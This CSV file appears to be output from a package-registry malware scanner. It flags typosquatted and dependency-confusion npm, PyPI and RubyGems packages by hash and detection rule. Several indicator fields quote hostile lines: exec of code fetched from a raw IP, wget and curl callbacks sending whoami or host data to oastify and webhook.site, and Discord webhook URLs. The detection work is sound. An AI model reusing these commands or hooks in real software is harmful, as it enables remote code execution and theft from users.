"created","ecosystem","hashes","id","indicators","name","version"
"Wed, 05 Jul 2023 20:05:19 GMT","pypi","{""archive"": ""pfadv20991-1.0.0.tar.gz"", ""hash"": ""71c92dbdcfdca5aba7bd84fb3e1357f51a446b91983f7bc044fec1493883e995"", ""type"": ""SHA256""}","71c92dbdcfdca5aba7bd84fb3e1357f51a446b91983f7bc044fec1493883e995","[{'name': 'suspicious_setup_commands_rule', 'val': [{'code': 'base64.b64decode(base64_bytes)`', 'type': 'String decoding'}]}, {'name': 'trivial_package_rule', 'val': True}]","pfadv20991","1.0.0"
"Tue, 26 Sep 2023 02:34:50 GMT","npm","{""archive"": ""xngularjs-1.1.2.tgz"", ""hash"": ""b243fca12e29d39f479e5c7969f8279dd1c81f594db1af7dbc88f01d5206bd61"", ""type"": ""SHA256""}","b243fca12e29d39f479e5c7969f8279dd1c81f594db1af7dbc88f01d5206bd61","[{'name': 'npm_hooks_rule', 'val': ['node new.js']}, {'name': 'suspicious_url_references_rule', 'val': [{'file': 'package/new.js', 'urls': ['https://discord.com/api/webhooks/1155988140591419412/bleuGvUtBCzaGsAkAI1MT9Yd']}]}, {'name': 'triaged_malware_rule', 'val': []}, {'name': 'trivial_package_rule', 'val': True}]","xngularjs","1.1.2"
"Tue, 26 Sep 2023 22:34:23 GMT","npm","{""archive"": ""rmeactjs-8.7.6.tgz"", ""hash"": ""c71a57c4228d217945a89e70ce7a4c663f6cf6294e2558176c49b03ac8000493"", ""type"": ""SHA256""}","c71a57c4228d217945a89e70ce7a4c663f6cf6294e2558176c49b03ac8000493","[{'name': 'npm_hooks_rule', 'val': ['node new.js']}, {'name': 'triaged_malware_rule', 'val': []}, {'name': 'trivial_package_rule', 'val': True}]","rmeactjs","8.7.6"
"Tue, 26 Sep 2023 06:56:13 GMT","npm","{""archive"": ""angtlarjs-1.1.4.tgz"", ""hash"": ""e09efaddcbea1f5e93ba028b7858ef932982e26130159b8a44fecf8156baef0c"", ""type"": ""SHA256""}","e09efaddcbea1f5e93ba028b7858ef932982e26130159b8a44fecf8156baef0c","[{'name': 'npm_hooks_rule', 'val': ['node new.js']}, {'name': 'suspicious_url_references_rule', 'val': [{'file': 'package/new.js', 'urls': ['https://discord.com/api/webhooks/1156079272264478792/mBYJcDha0NlSfdIi0JhnpIhhYpE1aR5eKcgNKrXH']}]}, {'name': 'triaged_malware_rule', 'val': []}]","angtlarjs","1.1.4"
"Sat, 17 Jun 2023 14:22:57 GMT","pypi","{""archive"": ""hase-0.0.1-py3-none-any.whl"", ""hash"": ""f5384decb6b69d8d2f296c26bebc7aae55f578c59a372472ea5de487ea7c3bb9"", ""type"": ""SHA256""}","f5384decb6b69d8d2f296c26bebc7aae55f578c59a372472ea5de487ea7c3bb9","[{'name': 'bad_author_rule', 'val': []}, {'name': 'executes_code_at_remote_url', 'val': [{'code': ['""exec(_uurlopen(\'http://95.215.8.170:8080/inject/YX88zvSlU5O7Skzb\').read())""'], 'file': 'hase-0.0.1/hase/__init__.py'}]}, {'name': 'ip_identification_rule', 'val': [{'file': 'hase-0.0.1/hase/__init__.py', 'ip': '95.215.8.170'}]}, {'name': 'trivial_package_rule', 'val': True}]","hase","0.0.1"
"Sat, 05 Aug 2023 13:32:38 GMT","pypi","{""archive"": ""CloseBullet_0.1.tar.gz"", ""hash"": ""ea45d3299e6992a36519d7937f400a71584282bb47b957472374fde457ad8f15"", ""type"": ""SHA256""}","ea45d3299e6992a36519d7937f400a71584282bb47b957472374fde457ad8f15","[{'name': 'null', 'val': []}]","CloseBullet","0.1"
"Mon, 31 Jul 2023 16:16:08 GMT","npm","{""archive"": ""flot-axis-1.0.0.tgz"", ""hash"": ""341d68ab98626903347b38b31181244fdc4fa0827f1ad02d8c5805ab12d897c2"", ""type"": ""SHA256""}","341d68ab98626903347b38b31181244fdc4fa0827f1ad02d8c5805ab12d897c2","[{'name': 'npm_hooks_rule', 'val': ['node index.js']}, {'name': 'suspicious_url_references_rule', 'val': [{'file': 'package/index.js', 'urls': ['an OAST server']}]}, {'name': 'trivial_package_rule', 'val': True}]","flot-axis","1.0.0"
"Tue, 22 Aug 2023 22:49:26 GMT","npm","{""archive"": ""le-core-infra-99.0.0.tgz"", ""hash"": ""ba34c9bad4f5db7b73e7a35e46a65b290a9eeb1ca2982275e2140105799244d5"", ""type"": ""SHA256""}","ba34c9bad4f5db7b73e7a35e46a65b290a9eeb1ca2982275e2140105799244d5","[{'name': 'dependency_confusion_rule', 'val': 'High major version'}, {'name': 'npm_hooks_rule', 'val': ['node index.js']}, {'name': 'suspicious_url_references_rule', 'val': [{'file': 'package/index.js', 'urls': ['an OAST server']}]}, {'name': 'trivial_package_rule', 'val': True}]","le-core-infra","99.0.0"
"Sun, 13 Aug 2023 22:25:48 GMT","npm","{""archive"": ""eslint-config-ironfish-react-99.99.9.tgz"", ""hash"": ""5c6cc72661a0587cf7881020ba89217585277179ef5e3e6e4c0af9c000379179"", ""type"": ""SHA256""}","5c6cc72661a0587cf7881020ba89217585277179ef5e3e6e4c0af9c000379179","[{'name': 'dependency_confusion_rule', 'val': 'High major version'}, {'name': 'npm_hooks_rule', 'val': ['node index.js']}, {'name': 'suspicious_url_references_rule', 'val': [{'file': 'package/index.js', 'urls': ['an OAST server']}]}, {'name': 'trivial_package_rule', 'val': True}]","eslint-config-ironfish-react","99.99.9"
"Mon, 11 Sep 2023 18:56:57 GMT","npm","{""archive"": ""darkhat-hard-to-find-package-do-not-require-it-1.0.1.tgz"", ""hash"": ""a1fed8b37fe0435cd0762440037eb38eccb81a99c4c464a15b7a6d562f3e03e2"", ""type"": ""SHA256""}","a1fed8b37fe0435cd0762440037eb38eccb81a99c4c464a15b7a6d562f3e03e2","[{'name': 'npm_hooks_rule', 'val': ['curl https://webhook.site/76a40c42-6fe4-4caf-9b37-49c5eda9ae20?darkhat=darkhat']}, {'name': 'suspicious_url_references_rule', 'val': [{'file': 'package/index.js', 'urls': ['webhook.site/76a40c42-6fe4-4caf-9b37-49c5eda9ae20']}]}, {'name': 'triaged_malware_rule', 'val': []}, {'name': 'trivial_package_rule', 'val': True}]","darkhat-hard-to-find-package-do-not-require-it","1.0.1"
"Tue, 13 Jun 2023 15:41:47 GMT","npm","{""archive"": ""elliptic-helper_1.2.7.tgz"", ""hash"": ""a58b6bb0901d509bb02dd3691c959ad49a678ce3ef254d176630ec4d244cd88d"", ""type"": ""SHA256""}","a58b6bb0901d509bb02dd3691c959ad49a678ce3ef254d176630ec4d244cd88d","[{'name': 'npm_hooks_rule', 'val': ['npm install sync-request && node main.js']}, {'name': 'trivial_package_rule', 'val': True}]","elliptic-helper","1.2.7"
"Wed, 27 Sep 2023 00:20:02 GMT","npm","{""archive"": ""angulurjs-8.7.6.tgz"", ""hash"": ""beb94643ff9b9a5ed0afe51e5900c0b2190d8c1ef0fbdace3500ea5a21c596fb"", ""type"": ""SHA256""}","beb94643ff9b9a5ed0afe51e5900c0b2190d8c1ef0fbdace3500ea5a21c596fb","[{'name': 'npm_hooks_rule', 'val': ['node new.js']}, {'name': 'triaged_malware_rule', 'val': []}, {'name': 'trivial_package_rule', 'val': True}]","angulurjs","8.7.6"
"Tue, 26 Sep 2023 06:16:48 GMT","npm","{""archive"": ""rjeactjs-1.1.4.tgz"", ""hash"": ""7a68ea7353450d3e114175ebb9ae2d714653b473df923e40b4a94f66e2b01794"", ""type"": ""SHA256""}","7a68ea7353450d3e114175ebb9ae2d714653b473df923e40b4a94f66e2b01794","[{'name': 'npm_hooks_rule', 'val': ['node new.js']}, {'name': 'suspicious_url_references_rule', 'val': [{'file': 'package/new.js', 'urls': ['https://discord.com/api/webhooks/1156079272264478792/mBYJcDha0NlSfdIi0JhnpIhhYpE1aR5eKcgNKrXH']}]}, {'name': 'triaged_malware_rule', 'val': []}]","rjeactjs","1.1.4"
"Thu, 22 Jun 2023 20:12:16 GMT","rubygems","{""archive"": ""ptrsec_rce_test-0.0.2.gem"", ""hash"": ""f98419fbb845d7e12c0a8d1254f7d9bfdaebff7e94eaec158df217c83d5b8bf0"", ""type"": ""SHA256""}","f98419fbb845d7e12c0a8d1254f7d9bfdaebff7e94eaec158df217c83d5b8bf0","[{'name': 'executes_code_at_remote_url', 'val': [{'code': ['\'exec(""wget https://oc4x75upig0o37xw0e34klhr4ia9ycm1.oastify.com/?d=$(whoami)"")\''], 'file': 'data/lib/ptrsec_rce_test.rb'}]}, {'name': 'suspicious_url_references_rule', 'val': [{'file': 'data/lib/ptrsec_rce_test.rb', 'urls': ['oastify.com']}]}, {'name': 'trivial_package_rule', 'val': True}]","ptrsec_rce_test","0.0.2"
"Sun, 17 Sep 2023 01:21:24 GMT","npm","{""archive"": ""inteken-app-client-9.9.7.tgz"", ""hash"": ""fe085866eef827e53b7ef3a4b88efde716d8c51a26b11f2dc66e0860161b3db8"", ""type"": ""SHA256""}","fe085866eef827e53b7ef3a4b88efde716d8c51a26b11f2dc66e0860161b3db8","[{'name': 'npm_hooks_rule', 'val': ['node index.js']}, {'name': 'triaged_malware_rule', 'val': []}, {'name': 'trivial_package_rule', 'val': True}]","inteken-app-client","9.9.7"
"Tue, 26 Sep 2023 03:04:25 GMT","npm","{""archive"": ""angslarjs-1.1.2.tgz"", ""hash"": ""9ab9ba35a4ec7022736b7f60187f65a5579ef4fb80d024172ddf55fa462c67fc"", ""type"": ""SHA256""}","9ab9ba35a4ec7022736b7f60187f65a5579ef4fb80d024172ddf55fa462c67fc","[{'name': 'npm_hooks_rule', 'val': ['node new.js']}, {'name': 'suspicious_url_references_rule', 'val': [{'file': 'package/new.js', 'urls': ['https://discord.com/api/webhooks/1155988140591419412/bleuGvUtBCzaGsAkAI1MT9Yd']}]}, {'name': 'triaged_malware_rule', 'val': []}, {'name': 'trivial_package_rule', 'val': True}]","angslarjs","1.1.2"
"Fri, 15 Sep 2023 20:43:52 GMT","pypi","{""archive"": ""langchainc_0.0.295.tar.gz"", ""hash"": ""3a5d1ad2b03a59ddf1b0976d0a333036fa7ce5b98d7770fd31191968999ccf60"", ""type"": ""SHA256""}","3a5d1ad2b03a59ddf1b0976d0a333036fa7ce5b98d7770fd31191968999ccf60","[{'name': 'triaged_malware_rule', 'val': []}, {'name': 'typosquatting_rule', 'val': ['langchain']}]","langchainc","0.0.295"
"Wed, 26 Jul 2023 01:48:20 GMT","npm","{""archive"": ""grizzly_sql_graph_visualization-0.1.9.tgz"", ""hash"": ""85a66d65efe6c235b6e6dc65f2c9a5a407703e4c4dd830cfa3039a4b7f60289e"", ""type"": ""SHA256""}","85a66d65efe6c235b6e6dc65f2c9a5a407703e4c4dd830cfa3039a4b7f60289e","[{'name': 'executes_code_at_remote_url', 'val': [{'code': ['\'exec(""a=$(hostname;pwd;whoami;echo \\\'grizzly_sql_graph_visualization\\\';curl \\nhttps://ifconfig.me;)\''], 'file': 'package/index.js'}]}, {'name': 'suspicious_url_references_rule', 'val': [{'file': 'package/index.js', 'urls': ['an OAST server', 'ifconfig.me', 'ident.me']}]}, {'name': 'trivial_package_rule', 'val': True}]","grizzly_sql_graph_visualization","0.1.9"
"Tue, 26 Sep 2023 06:56:57 GMT","npm","{""archive"": ""anguharjs-1.1.4.tgz"", ""hash"": ""be01406305561aca8f32b0fdd6600452521bae8e6c74fb059583f5b1213a3e17"", ""type"": ""SHA256""}","be01406305561aca8f32b0fdd6600452521bae8e6c74fb059583f5b1213a3e17","[{'name': 'npm_hooks_rule', 'val': ['node new.js']}, {'name': 'suspicious_url_references_rule', 'val': [{'file': 'package/new.js', 'urls': ['https://discord.com/api/webhooks/1156079272264478792/mBYJcDha0NlSfdIi0JhnpIhhYpE1aR5eKcgNKrXH']}]}, {'name': 'triaged_malware_rule', 'val': []}]","anguharjs","1.1.4"
